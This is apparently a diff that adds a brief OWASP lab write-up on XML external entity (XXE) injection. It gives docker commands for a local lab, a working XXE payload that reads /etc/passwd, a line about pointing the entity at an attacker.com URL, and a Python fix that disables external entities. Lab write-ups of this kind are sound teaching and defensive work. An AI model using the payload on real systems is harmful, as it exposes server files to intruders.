@@ -1,0 +1,26 @@
+#XXE
+##Preparation
+docker pull blabla1337/owasp-skf-lab:
+docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:
+##Exploit
+Add entity and bind this to a variable that will be printed:
+```<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>```
+
+So if you want to go to an external site, you could just place a path there:
+"http://www.attacker.com/text.txt" instead of the file.
+##Fix
+https://docs.python.org/3/library/xml.dom.pulldom.html
+So we add an extra parser.
+Add imports:
+from xml.sax import make_parser
+from xml.sax.handler import feature_external_ges^M
+Add parser:                                 
+    parser = make_parser()                                
+    parser.setFeature(feature_external_ges, False)                
+    doc = parseString(request.form['xxe'],parser=parser)^M        
